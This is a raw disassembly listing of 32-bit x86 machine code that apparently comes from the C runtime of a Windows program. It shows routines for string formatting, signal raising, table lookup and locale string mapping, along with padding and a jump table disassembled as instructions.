  40b782:	6a 00                	push   $0x0
  40b784:	e8 67 0b 00 00       	call   0x40c2f0
  40b789:	83 c4 08             	add    $0x8,%esp
  40b78c:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40b78f:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40b792:	5f                   	pop    %edi
  40b793:	5e                   	pop    %esi
  40b794:	5b                   	pop    %ebx
  40b795:	8b e5                	mov    %ebp,%esp
  40b797:	5d                   	pop    %ebp
  40b798:	c3                   	ret
  40b799:	cc                   	int3
  40b79a:	cc                   	int3
  40b79b:	cc                   	int3
  40b79c:	cc                   	int3
  40b79d:	cc                   	int3
  40b79e:	cc                   	int3
  40b79f:	cc                   	int3
  40b7a0:	55                   	push   %ebp
  40b7a1:	8b ec                	mov    %esp,%ebp
  40b7a3:	83 ec 2c             	sub    $0x2c,%esp
  40b7a6:	53                   	push   %ebx
  40b7a7:	56                   	push   %esi
  40b7a8:	57                   	push   %edi
  40b7a9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b7ac:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40b7af:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b7b3:	75 1e                	jne    0x40b7d3
  40b7b5:	68 2c fd 40 00       	push   $0x40fd2c
  40b7ba:	6a 00                	push   $0x0
  40b7bc:	6a 5a                	push   $0x5a
  40b7be:	68 3c fd 40 00       	push   $0x40fd3c
  40b7c3:	6a 02                	push   $0x2
  40b7c5:	e8 f6 dd ff ff       	call   0x4095c0
  40b7ca:	83 c4 14             	add    $0x14,%esp
  40b7cd:	83 f8 01             	cmp    $0x1,%eax
  40b7d0:	75 01                	jne    0x40b7d3
  40b7d2:	cc                   	int3
  40b7d3:	33 c9                	xor    %ecx,%ecx
  40b7d5:	85 c9                	test   %ecx,%ecx
  40b7d7:	75 d6                	jne    0x40b7af
  40b7d9:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40b7dd:	75 1e                	jne    0x40b7fd
  40b7df:	68 10 fd 40 00       	push   $0x40fd10
  40b7e4:	6a 00                	push   $0x0
  40b7e6:	6a 5b                	push   $0x5b
  40b7e8:	68 3c fd 40 00       	push   $0x40fd3c
  40b7ed:	6a 02                	push   $0x2
  40b7ef:	e8 cc dd ff ff       	call   0x4095c0
  40b7f4:	83 c4 14             	add    $0x14,%esp
  40b7f7:	83 f8 01             	cmp    $0x1,%eax
  40b7fa:	75 01                	jne    0x40b7fd
  40b7fc:	cc                   	int3
  40b7fd:	33 d2                	xor    %edx,%edx
  40b7ff:	85 d2                	test   %edx,%edx
  40b801:	75 d6                	jne    0x40b7d9
  40b803:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b806:	c7 40 0c 42 00 00 00 	movl   $0x42,0xc(%eax)
  40b80d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b810:	8b 55 08             	mov    0x8(%ebp),%edx
  40b813:	89 51 08             	mov    %edx,0x8(%ecx)
  40b816:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b819:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b81c:	89 08                	mov    %ecx,(%eax)
  40b81e:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b821:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b824:	89 42 04             	mov    %eax,0x4(%edx)
  40b827:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40b82a:	51                   	push   %ecx
  40b82b:	8b 55 10             	mov    0x10(%ebp),%edx
  40b82e:	52                   	push   %edx
  40b82f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b832:	50                   	push   %eax
  40b833:	e8 38 0d 00 00       	call   0x40c570
  40b838:	83 c4 0c             	add    $0xc,%esp
  40b83b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40b83e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b841:	8b 51 04             	mov    0x4(%ecx),%edx
  40b844:	83 ea 01             	sub    $0x1,%edx
  40b847:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b84a:	89 50 04             	mov    %edx,0x4(%eax)
  40b84d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b850:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  40b854:	7c 22                	jl     0x40b878
  40b856:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b859:	8b 02                	mov    (%edx),%eax
  40b85b:	c6 00 00             	movb   $0x0,(%eax)
  40b85e:	33 c9                	xor    %ecx,%ecx
  40b860:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40b866:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40b869:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b86c:	8b 02                	mov    (%edx),%eax
  40b86e:	83 c0 01             	add    $0x1,%eax
  40b871:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b874:	89 01                	mov    %eax,(%ecx)
  40b876:	eb 11                	jmp    0x40b889
  40b878:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b87b:	52                   	push   %edx
  40b87c:	6a 00                	push   $0x0
  40b87e:	e8 6d 0a 00 00       	call   0x40c2f0
  40b883:	83 c4 08             	add    $0x8,%esp
  40b886:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40b889:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40b88c:	5f                   	pop    %edi
  40b88d:	5e                   	pop    %esi
  40b88e:	5b                   	pop    %ebx
  40b88f:	8b e5                	mov    %ebp,%esp
  40b891:	5d                   	pop    %ebp
  40b892:	c3                   	ret
  40b893:	cc                   	int3
  40b894:	cc                   	int3
  40b895:	cc                   	int3
  40b896:	cc                   	int3
  40b897:	cc                   	int3
  40b898:	cc                   	int3
  40b899:	cc                   	int3
  40b89a:	cc                   	int3
  40b89b:	cc                   	int3
  40b89c:	cc                   	int3
  40b89d:	cc                   	int3
  40b89e:	cc                   	int3
  40b89f:	cc                   	int3
  40b8a0:	55                   	push   %ebp
  40b8a1:	8b ec                	mov    %esp,%ebp
  40b8a3:	83 ec 20             	sub    $0x20,%esp
  40b8a6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40b8ad:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8b0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40b8b3:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40b8b6:	83 e9 02             	sub    $0x2,%ecx
  40b8b9:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40b8bc:	83 7d e0 14          	cmpl   $0x14,-0x20(%ebp)
  40b8c0:	0f 87 a8 00 00 00    	ja     0x40b96e
  40b8c6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40b8c9:	33 d2                	xor    %edx,%edx
  40b8cb:	8a 90 c2 ba 40 00    	mov    0x40bac2(%eax),%dl
  40b8d1:	ff 24 95 aa ba 40 00 	jmp    *0x40baaa(,%edx,4)
  40b8d8:	c7 45 e8 64 de 45 00 	movl   $0x45de64,-0x18(%ebp)
  40b8df:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40b8e2:	8b 11                	mov    (%ecx),%edx
  40b8e4:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40b8e7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40b8ea:	83 c0 01             	add    $0x1,%eax
  40b8ed:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b8f0:	e9 81 00 00 00       	jmp    0x40b976
  40b8f5:	c7 45 e8 68 de 45 00 	movl   $0x45de68,-0x18(%ebp)
  40b8fc:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40b8ff:	8b 11                	mov    (%ecx),%edx
  40b901:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40b904:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40b907:	83 c0 01             	add    $0x1,%eax
  40b90a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b90d:	eb 67                	jmp    0x40b976
  40b90f:	c7 45 e8 6c de 45 00 	movl   $0x45de6c,-0x18(%ebp)
  40b916:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40b919:	8b 11                	mov    (%ecx),%edx
  40b91b:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40b91e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40b921:	83 c0 01             	add    $0x1,%eax
  40b924:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b927:	eb 4d                	jmp    0x40b976
  40b929:	c7 45 e8 70 de 45 00 	movl   $0x45de70,-0x18(%ebp)
  40b930:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40b933:	8b 11                	mov    (%ecx),%edx
  40b935:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40b938:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40b93b:	83 c0 01             	add    $0x1,%eax
  40b93e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b941:	eb 33                	jmp    0x40b976
  40b943:	e8 d8 8b ff ff       	call   0x404520
  40b948:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b94b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b94e:	8b 51 50             	mov    0x50(%ecx),%edx
  40b951:	52                   	push   %edx
  40b952:	8b 45 08             	mov    0x8(%ebp),%eax
  40b955:	50                   	push   %eax
  40b956:	e8 85 01 00 00       	call   0x40bae0
  40b95b:	83 c4 08             	add    $0x8,%esp
  40b95e:	83 c0 08             	add    $0x8,%eax
  40b961:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40b964:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40b967:	8b 11                	mov    (%ecx),%edx
  40b969:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40b96c:	eb 08                	jmp    0x40b976
  40b96e:	83 c8 ff             	or     $0xffffffff,%eax
  40b971:	e9 30 01 00 00       	jmp    0x40baa6
  40b976:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40b97a:	74 0a                	je     0x40b986
  40b97c:	6a 01                	push   $0x1
  40b97e:	e8 ed 7a ff ff       	call   0x403470
  40b983:	83 c4 04             	add    $0x4,%esp
  40b986:	83 7d e4 01          	cmpl   $0x1,-0x1c(%ebp)
  40b98a:	75 17                	jne    0x40b9a3
  40b98c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40b990:	74 0a                	je     0x40b99c
  40b992:	6a 01                	push   $0x1
  40b994:	e8 77 7b ff ff       	call   0x403510
  40b999:	83 c4 04             	add    $0x4,%esp
  40b99c:	33 c0                	xor    %eax,%eax
  40b99e:	e9 03 01 00 00       	jmp    0x40baa6
  40b9a3:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40b9a7:	75 17                	jne    0x40b9c0
  40b9a9:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40b9ad:	74 0a                	je     0x40b9b9
  40b9af:	6a 01                	push   $0x1
  40b9b1:	e8 5a 7b ff ff       	call   0x403510
  40b9b6:	83 c4 04             	add    $0x4,%esp
  40b9b9:	6a 03                	push   $0x3
  40b9bb:	e8 20 8e ff ff       	call   0x4047e0
  40b9c0:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  40b9c4:	74 0c                	je     0x40b9d2
  40b9c6:	83 7d 08 0b          	cmpl   $0xb,0x8(%ebp)
  40b9ca:	74 06                	je     0x40b9d2
  40b9cc:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  40b9d0:	75 2c                	jne    0x40b9fe
  40b9d2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b9d5:	8b 48 54             	mov    0x54(%eax),%ecx
  40b9d8:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40b9db:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40b9de:	c7 42 54 00 00 00 00 	movl   $0x0,0x54(%edx)
  40b9e5:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  40b9e9:	75 13                	jne    0x40b9fe
  40b9eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b9ee:	8b 48 58             	mov    0x58(%eax),%ecx
  40b9f1:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40b9f4:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40b9f7:	c7 42 58 8c 00 00 00 	movl   $0x8c,0x58(%edx)
  40b9fe:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  40ba02:	75 3c                	jne    0x40ba40
  40ba04:	a1 c0 b0 45 00       	mov    0x45b0c0,%eax
  40ba09:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40ba0c:	eb 09                	jmp    0x40ba17
  40ba0e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ba11:	83 c1 01             	add    $0x1,%ecx
  40ba14:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40ba17:	8b 15 c0 b0 45 00    	mov    0x45b0c0,%edx
  40ba1d:	03 15 c4 b0 45 00    	add    0x45b0c4,%edx
  40ba23:	39 55 f0             	cmp    %edx,-0x10(%ebp)
  40ba26:	7d 16                	jge    0x40ba3e
  40ba28:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40ba2b:	6b c0 0c             	imul   $0xc,%eax,%eax
  40ba2e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ba31:	8b 51 50             	mov    0x50(%ecx),%edx
  40ba34:	c7 44 02 08 00 00 00 	movl   $0x0,0x8(%edx,%eax,1)
  40ba3b:	00 
  40ba3c:	eb d0                	jmp    0x40ba0e
  40ba3e:	eb 09                	jmp    0x40ba49
  40ba40:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40ba43:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40ba49:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40ba4d:	74 0a                	je     0x40ba59
  40ba4f:	6a 01                	push   $0x1
  40ba51:	e8 ba 7a ff ff       	call   0x403510
  40ba56:	83 c4 04             	add    $0x4,%esp
  40ba59:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  40ba5d:	75 11                	jne    0x40ba70
  40ba5f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ba62:	8b 51 58             	mov    0x58(%ecx),%edx
  40ba65:	52                   	push   %edx
  40ba66:	6a 08                	push   $0x8
  40ba68:	ff 55 e4             	call   *-0x1c(%ebp)
  40ba6b:	83 c4 08             	add    $0x8,%esp
  40ba6e:	eb 0a                	jmp    0x40ba7a
  40ba70:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba73:	50                   	push   %eax
  40ba74:	ff 55 e4             	call   *-0x1c(%ebp)
  40ba77:	83 c4 04             	add    $0x4,%esp
  40ba7a:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  40ba7e:	74 0c                	je     0x40ba8c
  40ba80:	83 7d 08 0b          	cmpl   $0xb,0x8(%ebp)
  40ba84:	74 06                	je     0x40ba8c
  40ba86:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  40ba8a:	75 18                	jne    0x40baa4
  40ba8c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ba8f:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40ba92:	89 51 54             	mov    %edx,0x54(%ecx)
  40ba95:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  40ba99:	75 09                	jne    0x40baa4
  40ba9b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ba9e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40baa1:	89 48 58             	mov    %ecx,0x58(%eax)
  40baa4:	33 c0                	xor    %eax,%eax
  40baa6:	8b e5                	mov    %ebp,%esp
  40baa8:	5d                   	pop    %ebp
  40baa9:	c3                   	ret
  40baaa:	d8 b8 40 00 43 b9    	fdivrs -0x46bcffc0(%eax)
  40bab0:	40                   	inc    %eax
  40bab1:	00 29                	add    %ch,(%ecx)
  40bab3:	b9 40 00 f5 b8       	mov    $0xb8f50040,%ecx
  40bab8:	40                   	inc    %eax
  40bab9:	00 0f                	add    %cl,(%edi)
  40babb:	b9 40 00 6e b9       	mov    $0xb96e0040,%ecx
  40bac0:	40                   	inc    %eax
  40bac1:	00 00                	add    %al,(%eax)
  40bac3:	05 01 05 05 05       	add    $0x5050501,%eax
  40bac8:	01 05 05 01 05 05    	add    %eax,0x5050105
  40bace:	05 02 05 05 05       	add    $0x5050502,%eax
  40bad3:	05 05 03 04 cc       	add    $0xcc040305,%eax
  40bad8:	cc                   	int3
  40bad9:	cc                   	int3
  40bada:	cc                   	int3
  40badb:	cc                   	int3
  40badc:	cc                   	int3
  40badd:	cc                   	int3
  40bade:	cc                   	int3
  40badf:	cc                   	int3
  40bae0:	55                   	push   %ebp
  40bae1:	8b ec                	mov    %esp,%ebp
  40bae3:	51                   	push   %ecx
  40bae4:	8b 45 0c             	mov    0xc(%ebp),%eax
  40bae7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40baea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40baed:	8b 51 04             	mov    0x4(%ecx),%edx
  40baf0:	3b 55 08             	cmp    0x8(%ebp),%edx
  40baf3:	74 1e                	je     0x40bb13
  40baf5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40baf8:	83 c0 0c             	add    $0xc,%eax
  40bafb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40bafe:	8b 0d cc b0 45 00    	mov    0x45b0cc,%ecx
  40bb04:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  40bb07:	8b 55 0c             	mov    0xc(%ebp),%edx
  40bb0a:	03 d1                	add    %ecx,%edx
  40bb0c:	39 55 fc             	cmp    %edx,-0x4(%ebp)
  40bb0f:	73 02                	jae    0x40bb13
  40bb11:	eb d7                	jmp    0x40baea
  40bb13:	a1 cc b0 45 00       	mov    0x45b0cc,%eax
  40bb18:	6b c0 0c             	imul   $0xc,%eax,%eax
  40bb1b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40bb1e:	03 c8                	add    %eax,%ecx
  40bb20:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  40bb23:	73 10                	jae    0x40bb35
  40bb25:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40bb28:	8b 42 04             	mov    0x4(%edx),%eax
  40bb2b:	3b 45 08             	cmp    0x8(%ebp),%eax
  40bb2e:	75 05                	jne    0x40bb35
  40bb30:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40bb33:	eb 02                	jmp    0x40bb37
  40bb35:	33 c0                	xor    %eax,%eax
  40bb37:	8b e5                	mov    %ebp,%esp
  40bb39:	5d                   	pop    %ebp
  40bb3a:	c3                   	ret
  40bb3b:	cc                   	int3
  40bb3c:	cc                   	int3
  40bb3d:	cc                   	int3
  40bb3e:	cc                   	int3
  40bb3f:	cc                   	int3
  40bb40:	55                   	push   %ebp
  40bb41:	8b ec                	mov    %esp,%ebp
  40bb43:	6a ff                	push   $0xffffffff
  40bb45:	68 50 fd 40 00       	push   $0x40fd50
  40bb4a:	68 f8 5a 40 00       	push   $0x405af8
  40bb4f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40bb55:	50                   	push   %eax
  40bb56:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40bb5d:	83 c4 dc             	add    $0xffffffdc,%esp
  40bb60:	53                   	push   %ebx
  40bb61:	56                   	push   %esi
  40bb62:	57                   	push   %edi
  40bb63:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40bb66:	83 3d 98 de 45 00 00 	cmpl   $0x0,0x45de98
  40bb6d:	75 57                	jne    0x40bbc6
  40bb6f:	6a 00                	push   $0x0
  40bb71:	6a 00                	push   $0x0
  40bb73:	6a 01                	push   $0x1
  40bb75:	68 4c fd 40 00       	push   $0x40fd4c
  40bb7a:	68 00 01 00 00       	push   $0x100
  40bb7f:	6a 00                	push   $0x0
  40bb81:	ff 15 e0 f0 40 00    	call   *0x40f0e0
  40bb87:	85 c0                	test   %eax,%eax
  40bb89:	74 0c                	je     0x40bb97
  40bb8b:	c7 05 98 de 45 00 01 	movl   $0x1,0x45de98
  40bb92:	00 00 00 
  40bb95:	eb 2f                	jmp    0x40bbc6
  40bb97:	6a 00                	push   $0x0
  40bb99:	6a 00                	push   $0x0
  40bb9b:	6a 01                	push   $0x1
  40bb9d:	68 48 fd 40 00       	push   $0x40fd48
  40bba2:	68 00 01 00 00       	push   $0x100
  40bba7:	6a 00                	push   $0x0
  40bba9:	ff 15 dc f0 40 00    	call   *0x40f0dc
  40bbaf:	85 c0                	test   %eax,%eax
  40bbb1:	74 0c                	je     0x40bbbf
  40bbb3:	c7 05 98 de 45 00 02 	movl   $0x2,0x45de98
  40bbba:	00 00 00 
  40bbbd:	eb 07                	jmp    0x40bbc6
  40bbbf:	33 c0                	xor    %eax,%eax
  40bbc1:	e9 6b 02 00 00       	jmp    0x40be31
  40bbc6:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40bbca:	7e 13                	jle    0x40bbdf
  40bbcc:	8b 45 14             	mov    0x14(%ebp),%eax
  40bbcf:	50                   	push   %eax
  40bbd0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40bbd3:	51                   	push   %ecx
  40bbd4:	e8 77 02 00 00       	call   0x40be50
  40bbd9:	83 c4 08             	add    $0x8,%esp
  40bbdc:	89 45 14             	mov    %eax,0x14(%ebp)
  40bbdf:	83 3d 98 de 45 00 02 	cmpl   $0x2,0x45de98
  40bbe6:	75 23                	jne    0x40bc0b
  40bbe8:	8b 55 1c             	mov    0x1c(%ebp),%edx
  40bbeb:	52                   	push   %edx
  40bbec:	8b 45 18             	mov    0x18(%ebp),%eax
  40bbef:	50                   	push   %eax
  40bbf0:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40bbf3:	51                   	push   %ecx
  40bbf4:	8b 55 10             	mov    0x10(%ebp),%edx
  40bbf7:	52                   	push   %edx
  40bbf8:	8b 45 0c             	mov    0xc(%ebp),%eax
  40bbfb:	50                   	push   %eax
  40bbfc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bbff:	51                   	push   %ecx
  40bc00:	ff 15 dc f0 40 00    	call   *0x40f0dc
  40bc06:	e9 26 02 00 00       	jmp    0x40be31
  40bc0b:	83 3d 98 de 45 00 01 	cmpl   $0x1,0x45de98
  40bc12:	0f 85 17 02 00 00    	jne    0x40be2f
  40bc18:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40bc1c:	75 09                	jne    0x40bc27
  40bc1e:	8b 15 90 de 45 00    	mov    0x45de90,%edx
  40bc24:	89 55 20             	mov    %edx,0x20(%ebp)
  40bc27:	6a 00                	push   $0x0
  40bc29:	6a 00                	push   $0x0
  40bc2b:	8b 45 14             	mov    0x14(%ebp),%eax
  40bc2e:	50                   	push   %eax
  40bc2f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40bc32:	51                   	push   %ecx
  40bc33:	8b 55 24             	mov    0x24(%ebp),%edx
  40bc36:	f7 da                	neg    %edx
  40bc38:	1b d2                	sbb    %edx,%edx
  40bc3a:	83 e2 08             	and    $0x8,%edx
  40bc3d:	83 c2 01             	add    $0x1,%edx
  40bc40:	52                   	push   %edx
  40bc41:	8b 45 20             	mov    0x20(%ebp),%eax
  40bc44:	50                   	push   %eax
  40bc45:	ff 15 d8 f0 40 00    	call   *0x40f0d8
  40bc4b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40bc4e:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40bc52:	75 07                	jne    0x40bc5b
  40bc54:	33 c0                	xor    %eax,%eax
  40bc56:	e9 d6 01 00 00       	jmp    0x40be31
  40bc5b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40bc62:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40bc65:	d1 e0                	shl    $1,%eax
  40bc67:	83 c0 03             	add    $0x3,%eax
  40bc6a:	24 fc                	and    $0xfc,%al
  40bc6c:	e8 bf f2 ff ff       	call   0x40af30
  40bc71:	89 65 d0             	mov    %esp,-0x30(%ebp)
  40bc74:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40bc77:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40bc7a:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40bc7d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40bc84:	eb 17                	jmp    0x40bc9d
  40bc86:	b8 01 00 00 00       	mov    $0x1,%eax
  40bc8b:	c3                   	ret
  40bc8c:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40bc8f:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40bc96:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40bc9d:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40bca1:	75 07                	jne    0x40bcaa
  40bca3:	33 c0                	xor    %eax,%eax
  40bca5:	e9 87 01 00 00       	jmp    0x40be31
  40bcaa:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40bcad:	52                   	push   %edx
  40bcae:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40bcb1:	50                   	push   %eax
  40bcb2:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40bcb5:	51                   	push   %ecx
  40bcb6:	8b 55 10             	mov    0x10(%ebp),%edx
  40bcb9:	52                   	push   %edx
  40bcba:	6a 01                	push   $0x1
  40bcbc:	8b 45 20             	mov    0x20(%ebp),%eax
  40bcbf:	50                   	push   %eax
  40bcc0:	ff 15 d8 f0 40 00    	call   *0x40f0d8
  40bcc6:	85 c0                	test   %eax,%eax
  40bcc8:	75 07                	jne    0x40bcd1
  40bcca:	33 c0                	xor    %eax,%eax
  40bccc:	e9 60 01 00 00       	jmp    0x40be31
  40bcd1:	6a 00                	push   $0x0
  40bcd3:	6a 00                	push   $0x0
  40bcd5:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40bcd8:	51                   	push   %ecx
  40bcd9:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40bcdc:	52                   	push   %edx
  40bcdd:	8b 45 0c             	mov    0xc(%ebp),%eax
  40bce0:	50                   	push   %eax
  40bce1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bce4:	51                   	push   %ecx
  40bce5:	ff 15 e0 f0 40 00    	call   *0x40f0e0
  40bceb:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40bcee:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40bcf2:	75 07                	jne    0x40bcfb
  40bcf4:	33 c0                	xor    %eax,%eax
  40bcf6:	e9 36 01 00 00       	jmp    0x40be31
  40bcfb:	8b 55 0c             	mov    0xc(%ebp),%edx
  40bcfe:	81 e2 00 04 00 00    	and    $0x400,%edx
  40bd04:	85 d2                	test   %edx,%edx
  40bd06:	74 43                	je     0x40bd4b
  40bd08:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  40bd0c:	74 38                	je     0x40bd46
  40bd0e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40bd11:	3b 45 1c             	cmp    0x1c(%ebp),%eax
  40bd14:	7e 07                	jle    0x40bd1d
  40bd16:	33 c0                	xor    %eax,%eax
  40bd18:	e9 14 01 00 00       	jmp    0x40be31
  40bd1d:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  40bd20:	51                   	push   %ecx
  40bd21:	8b 55 18             	mov    0x18(%ebp),%edx
  40bd24:	52                   	push   %edx
  40bd25:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40bd28:	50                   	push   %eax
  40bd29:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40bd2c:	51                   	push   %ecx
  40bd2d:	8b 55 0c             	mov    0xc(%ebp),%edx
  40bd30:	52                   	push   %edx
  40bd31:	8b 45 08             	mov    0x8(%ebp),%eax
  40bd34:	50                   	push   %eax
  40bd35:	ff 15 e0 f0 40 00    	call   *0x40f0e0
  40bd3b:	85 c0                	test   %eax,%eax
  40bd3d:	75 07                	jne    0x40bd46
  40bd3f:	33 c0                	xor    %eax,%eax
  40bd41:	e9 eb 00 00 00       	jmp    0x40be31
  40bd46:	e9 df 00 00 00       	jmp    0x40be2a
  40bd4b:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40bd4e:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40bd51:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40bd58:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40bd5b:	d1 e0                	shl    $1,%eax
  40bd5d:	83 c0 03             	add    $0x3,%eax
  40bd60:	24 fc                	and    $0xfc,%al
  40bd62:	e8 c9 f1 ff ff       	call   0x40af30
  40bd67:	89 65 cc             	mov    %esp,-0x34(%ebp)
  40bd6a:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40bd6d:	8b 55 cc             	mov    -0x34(%ebp),%edx
  40bd70:	89 55 e0             	mov    %edx,-0x20(%ebp)
  40bd73:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40bd7a:	eb 17                	jmp    0x40bd93
  40bd7c:	b8 01 00 00 00       	mov    $0x1,%eax
  40bd81:	c3                   	ret
  40bd82:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40bd85:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40bd8c:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40bd93:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40bd97:	75 07                	jne    0x40bda0
  40bd99:	33 c0                	xor    %eax,%eax
  40bd9b:	e9 91 00 00 00       	jmp    0x40be31
